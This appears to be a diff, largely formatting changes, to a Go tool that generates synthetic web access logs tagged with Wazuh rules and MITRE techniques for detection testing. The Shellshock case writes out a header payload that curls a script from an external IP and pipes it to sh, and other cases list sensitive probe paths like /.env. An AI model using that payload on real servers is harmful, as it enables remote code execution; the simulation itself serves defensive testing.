@@ -65,9 +65,9 @@ type webErrCase struct {
 	mitre    []string
 	wazuh    []string
 
-	level   string // nginx level / apache module:level
-	nginx   func(c *core.Ctx, client string) string
-	apache  func(c *core.Ctx, client string, port int) string
+	level  string // nginx level / apache module:level
+	nginx  func(c *core.Ctx, client string) string
+	apache func(c *core.Ctx, client string, port int) string
 }
 
 func init() {
@@ -154,16 +154,18 @@ func webAccessCases() []webCase {
 			desc:     "A successful GET, the baseline every web detection rule has to tolerate.",
 			severity: core.SevLabelInfo, wazuh: []string{"31100"},
 			method: "GET", status: 200,
-			path:  func(c *core.Ctx) string { return c.Pick("/", "/index.html", "/about", "/api/v1/products", "/static/app.css") },
-			size:  page, agent: anyUA, referer: noRef, user: noUser,
+			path: func(c *core.Ctx) string {
+				return c.Pick("/", "/index.html", "/about", "/api/v1/products", "/static/app.css")
+			},
+			size: page, agent: anyUA, referer: noRef, user: noUser,
 		},
 		{
 			key: "200-login", name: "Successful login POST", group: "Traffic",
 			desc:     "An authenticated POST to a login endpoint.",
 			severity: core.SevLabelInfo, wazuh: []string{"31100"},
 			method: "POST", status: 302,
-			path:  func(c *core.Ctx) string { return c.Pick("/login", "/api/auth/login", "/wp-login.php") },
-			size:  small, agent: anyUA, referer: noRef,
+			path: func(c *core.Ctx) string { return c.Pick("/login", "/api/auth/login", "/wp-login.php") },
+			size: small, agent: anyUA, referer: noRef,
 			user: func(c *core.Ctx) string { return c.User() },
 		},
 		{
@@ -171,16 +173,16 @@ func webAccessCases() []webCase {
 			desc:     "Credentials were missing or wrong. Burst this to simulate credential stuffing.",
 			severity: core.SevLabelMedium, mitre: []string{"T1110"}, wazuh: []string{"31101", "31151"},
 			method: "GET", status: 401, external: true,
-			path:  func(c *core.Ctx) string { return c.Pick("/admin", "/api/v1/users", "/manager/html") },
-			size:  small, agent: anyUA, referer: noRef, user: noUser,
+			path: func(c *core.Ctx) string { return c.Pick("/admin", "/api/v1/users", "/manager/html") },
+			size: small, agent: anyUA, referer: noRef, user: noUser,
 		},
 		{
 			key: "403-forbidden", name: "Forbidden (403)", group: "Traffic",
 			desc:     "The server refused the request. Often the visible result of a WAF rule.",
 			severity: core.SevLabelMedium, wazuh: []string{"31101"},
 			method: "GET", status: 403, external: true,
-			path:  func(c *core.Ctx) string { return c.Pick("/.env", "/.git/config", "/config.php", "/backup.sql") },
-			size:  small, agent: anyUA, referer: noRef, user: noUser,
+			path: func(c *core.Ctx) string { return c.Pick("/.env", "/.git/config", "/config.php", "/backup.sql") },
+			size: small, agent: anyUA, referer: noRef, user: noUser,
 		},
 		{
 			key: "404-notfound", name: "Not found (404)", group: "Traffic",
@@ -197,8 +199,8 @@ func webAccessCases() []webCase {
 			desc:     "The application failed. A spike can mean exploitation of an unhandled input.",
 			severity: core.SevLabelMedium, wazuh: []string{"31106"},
 			method: "POST", status: 500,
-			path:  func(c *core.Ctx) string { return c.Pick("/api/v1/orders", "/checkout", "/api/v1/upload") },
-			size:  small, agent: anyUA, referer: noRef, user: noUser,
+			path: func(c *core.Ctx) string { return c.Pick("/api/v1/orders", "/checkout", "/api/v1/upload") },
+			size: small, agent: anyUA, referer: noRef, user: noUser,
 		},
 		{
 			key: "sqli", name: "SQL injection attempt", group: "Web Attack",
@@ -288,7 +290,9 @@ func webAccessCases() []webCase {
 			desc:     "A request whose User-Agent identifies a scanning tool.",
 			severity: core.SevLabelMedium, mitre: []string{"T1595.002"}, wazuh: []string{"31101"},
 			method: "GET", status: 404, external: true,
-			path: func(c *core.Ctx) string { return c.Pick("/admin/config.php", "/cgi-bin/", "/test.php", "/server-status") },
+			path: func(c *core.Ctx) string {
+				return c.Pick("/admin/config.php", "/cgi-bin/", "/test.php", "/server-status")
+			},
 			size: small,
 			agent: func(c *core.Ctx) string {
 				return c.Pick(
@@ -306,9 +310,9 @@ func webAccessCases() []webCase {
 			desc:     "A CGI request carrying a bash function definition in a header value.",
 			severity: core.SevLabelHigh, mitre: []string{"T1190"}, wazuh: []string{"31168"},
 			method: "GET", status: 500, external: true,
-			path:  func(c *core.Ctx) string { return c.Pick("/cgi-bin/status", "/cgi-bin/test.cgi", "/cgi-bin/admin.sh") },
-			size:  small,
-			agent: func(c *core.Ctx) string { return "() { :; }; /bin/bash -c 'curl http://" + c.ExternalIP() + "/x|sh'" },
+			path:    func(c *core.Ctx) string { return c.Pick("/cgi-bin/status", "/cgi-bin/test.cgi", "/cgi-bin/admin.sh") },
+			size:    small,
+			agent:   func(c *core.Ctx) string { return "() { :; }; /bin/bash -c 'curl http://" + c.ExternalIP() + "/x|sh'" },
 			referer: noRef, user: noUser,
 		},
 		{
@@ -316,8 +320,10 @@ func webAccessCases() []webCase {
 			desc:     "A failed login POST. Burst this control to produce a credible brute force run.",
 			severity: core.SevLabelHigh, mitre: []string{"T1110"}, wazuh: []string{"31101", "31151"},
 			method: "POST", status: 401, external: true,
-			path:  func(c *core.Ctx) string { return c.Pick("/wp-login.php", "/login", "/api/auth/login", "/administrator/index.php") },
-			size:  small, agent: anyUA,
+			path: func(c *core.Ctx) string {
+				return c.Pick("/wp-login.php", "/login", "/api/auth/login", "/administrator/index.php")
+			},
+			size: small, agent: anyUA,
 			referer: func(c *core.Ctx) string { return "http://" + c.Env.WebHost + "/wp-login.php" },
 			user:    noUser,
 		},
@@ -326,7 +332,9 @@ func webAccessCases() []webCase {
 			desc:     "An oversized POST. Repeated large uploads can indicate staging or exfiltration.",
 			severity: core.SevLabelMedium, mitre: []string{"T1041"}, wazuh: []string{"31100"},
 			method: "POST", status: 201,
-			path:  func(c *core.Ctx) string { return c.Pick("/api/v1/upload", "/files/import", "/wp-admin/async-upload.php") },
+			path: func(c *core.Ctx) string {
+				return c.Pick("/api/v1/upload", "/files/import", "/wp-admin/async-upload.php")
+			},
 			size:  func(c *core.Ctx) int { return c.Int(20_000_000, 240_000_000) },
 			agent: anyUA, referer: noRef,
 			user: func(c *core.Ctx) string { return c.User() },
